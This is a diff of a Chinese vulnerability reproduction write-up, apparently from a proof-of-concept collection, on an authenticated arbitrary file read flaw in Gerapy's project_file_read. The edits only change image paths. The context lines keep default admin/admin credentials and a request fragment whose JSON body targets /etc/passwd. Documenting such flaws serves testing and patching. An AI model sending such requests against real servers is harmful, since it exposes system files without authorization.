@@ -54,7 +54,7 @@ docker-compose up -d
 
 启动完成后，访问 `http://your-ip:8000` 即可查看登录页面，通过默认口令 `admin/admin` 登录后台。
 
-![](Public/Awesome-POC/Web应用漏洞/images/Gerapy%20project_file_read%20后台任意文件读取漏洞/image-20250516170319239.png)
+![](images/Gerapy%20project_file_read%20后台任意文件读取漏洞/image-20250516170319239.png)
 
 ## 漏洞复现
 
@@ -77,7 +77,7 @@ def project_file_read(request):
             return HttpResponse(f.read().decode('utf-8'))
 ```
 
-![](Public/Awesome-POC/Web应用漏洞/images/Gerapy%20project_file_read%20后台任意文件读取漏洞/image-20250516170104352.png)
+![](images/Gerapy%20project_file_read%20后台任意文件读取漏洞/image-20250516170104352.png)
 
 构造请求包：
 
@@ -95,7 +95,7 @@ Authorization: Token e8279162677dd4fbfefe352b0f51ea8ad19cace5
 {"path":"/etc/","label":"passwd"}
 ```
 
-![](Public/Awesome-POC/Web应用漏洞/images/Gerapy%20project_file_read%20后台任意文件读取漏洞/image-20250516170502226.png)
+![](images/Gerapy%20project_file_read%20后台任意文件读取漏洞/image-20250516170502226.png)
 
 ## 漏洞修复
 
